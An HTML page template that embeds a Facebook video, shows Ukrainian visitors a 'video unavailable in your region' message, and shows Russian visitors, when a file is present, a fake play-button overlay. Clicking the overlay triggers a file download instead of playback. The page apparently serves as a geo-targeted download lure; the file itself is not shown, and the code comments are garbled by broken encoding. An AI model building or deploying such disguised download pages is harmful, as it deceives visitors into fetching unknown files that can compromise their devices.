<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>{{ site.title }}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background: black;
        overflow: hidden;
      }
      .ua {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        width: 100vw;
        font-family: Arial, sans-serif;
        font-size: 28px;
        color: white;
        background: #0f1216;
      }
      .video-wrap {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        overflow: hidden;
      }
      .video-wrap iframe {
        width: 100%;
        height: 100%;
        border: none;
        object-fit: cover;
      }

      /* üîπ –æ–≤–µ—Ä–ª–µ–π –¥–ª—è –†–§ */
      .download-overlay {
        position: fixed;
        inset: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(0, 0, 0, 0.25);
        cursor: pointer;
        z-index: 10;
      }
      .download-overlay.hidden {
        display: none;
      }
      .download-overlay .btn {
        width: 90px;
        height: 90px;
        border-radius: 50%;
        border: 3px solid white;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .download-overlay .btn::before {
        content: "";
        border-style: solid;
        border-width: 14px 0 14px 24px;
        border-color: transparent transparent transparent white;
        margin-left: 4px;
      }
    </style>
  </head>
  <body>
    {% if is_ua %}
      <div class="ua">
        –í—ñ–¥–µ–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ –¥–ª—è –≤–∞—à–æ–≥–æ —Ä–µ–≥—ñ–æ–Ω—É
      </div>
    {% else %}
      <div class="video-wrap">
        <iframe
          src="https://www.facebook.com/plugins/video.php?href={{ video_url | urlencode }}&show_text=false&autoplay=true&mute=1"
          allow="fullscreen; encrypted-media"
          allowfullscreen>
        </iframe>
      </div>

      <!-- üîπ –û–≤–µ—Ä–ª–µ–π –¥–ª—è –†–§ -->
      <div id="download-overlay" class="download-overlay hidden">
        <div class="btn"></div>
      </div>
    {% endif %}
    
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const isRu = {{ "true" if is_ru else "false" }};
        const hasFile = {{ "true" if has_file else "false" }};

        const overlay = document.getElementById("download-overlay");
        if (!overlay) return;

        if (isRu && hasFile) {
          overlay.classList.remove("hidden");
        } else {
          overlay.classList.add("hidden");
          return;
        }

        function buildDownloadUrl() {
          const url = new URL(window.location.href);
          url.searchParams.set("download", "1");
          return url.toString();
        }

        overlay.addEventListener("click", function (e) {
          e.preventDefault();
          e.stopPropagation();
          window.location.href = buildDownloadUrl();
        });
      });
    </script>
  </body>
</html>
